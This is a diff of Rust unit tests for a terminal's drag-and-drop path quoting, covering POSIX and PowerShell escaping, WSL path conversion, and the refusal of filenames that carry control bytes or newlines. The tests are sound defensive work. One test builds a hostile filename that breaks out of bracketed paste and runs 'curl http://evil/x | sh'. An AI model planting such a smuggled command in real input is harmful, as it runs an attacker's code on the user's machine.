@@ -222,3 +222,97 @@ fn ignores_lsof_output_with_no_path() {
     // A permission error leaves a relative or bare marker, never a path.
     assert_eq!(parse_lsof_cwd("p1\nfcwd\nnno-such-thing"), None);
 }
+
+#[test]
+fn a_dropped_path_is_quoted_for_the_shell_that_will_read_it() {
+    let paths = vec!["/code/my app/notes.md".to_string()];
+
+    assert_eq!(
+        drop_text(&paths, Quoting::Posix, false),
+        "'/code/my app/notes.md' "
+    );
+    assert_eq!(
+        drop_text(&paths, Quoting::Powershell, false),
+        "'/code/my app/notes.md' "
+    );
+}
+
+#[test]
+fn a_quote_in_a_filename_cannot_end_the_quoting() {
+    // A file really can be called this, and the two shells escape it
+    // differently — POSIX by closing and reopening, PowerShell by doubling.
+    let paths = vec!["/tmp/it's here.txt".to_string()];
+
+    assert_eq!(
+        drop_text(&paths, Quoting::Posix, false),
+        r"'/tmp/it'\''s here.txt' "
+    );
+    assert_eq!(
+        drop_text(&paths, Quoting::Powershell, false),
+        "'/tmp/it''s here.txt' "
+    );
+}
+
+#[test]
+fn several_dropped_files_arrive_as_several_arguments() {
+    let paths = vec!["/a.txt".to_string(), "/b.txt".to_string()];
+
+    assert_eq!(
+        drop_text(&paths, Quoting::Posix, false),
+        "'/a.txt' '/b.txt' "
+    );
+}
+
+#[test]
+fn a_drop_on_a_wsl_session_gets_the_path_the_distro_can_open() {
+    // `C:\code\a.txt` names nothing inside the distro.
+    let paths = vec!["C:\\code\\a.txt".to_string()];
+
+    assert_eq!(
+        drop_text(&paths, Quoting::Posix, true),
+        "'/mnt/c/code/a.txt' "
+    );
+}
+
+#[test]
+fn a_drop_of_nothing_types_nothing() {
+    // The event fires with an empty list when a drag is cancelled over the
+    // window, and a bare space would still be a keystroke the agent sees.
+    assert_eq!(drop_text(&[], Quoting::Posix, false), "");
+    assert_eq!(drop_text(&[String::new()], Quoting::Posix, false), "");
+}
+
+#[test]
+fn a_filename_carrying_control_bytes_is_never_typed() {
+    // Quoting keeps its balance, but the text is delivered through bracketed
+    // paste, which does not strip an end marker embedded in it — so the
+    // receiving program would leave paste mode and read the rest as keys.
+    let hostile = "/repo/x\u{1b}[201~; curl http://evil/x | sh\r".to_string();
+
+    let paths = [hostile];
+    assert_eq!(drop_text(&paths, Quoting::Posix, false), "");
+    assert_eq!(drop_text(&paths, Quoting::Powershell, false), "");
+}
+
+#[test]
+fn a_newline_in_a_filename_is_refused_too() {
+    // xterm turns a newline into a carriage return, which submits the line.
+    assert_eq!(
+        drop_text(&["/repo/two\nlines.txt".to_string()], Quoting::Posix, false),
+        ""
+    );
+}
+
+#[test]
+fn refusing_one_path_still_drops_the_others() {
+    let paths = vec![
+        "/repo/fine.txt".to_string(),
+        "/repo/bad\u{1b}.txt".to_string(),
+        "/repo/also fine.txt".to_string(),
+    ];
+
+    assert_eq!(
+        drop_text(&paths, Quoting::Posix, false),
+        "'/repo/fine.txt' '/repo/also fine.txt' "
+    );
+}
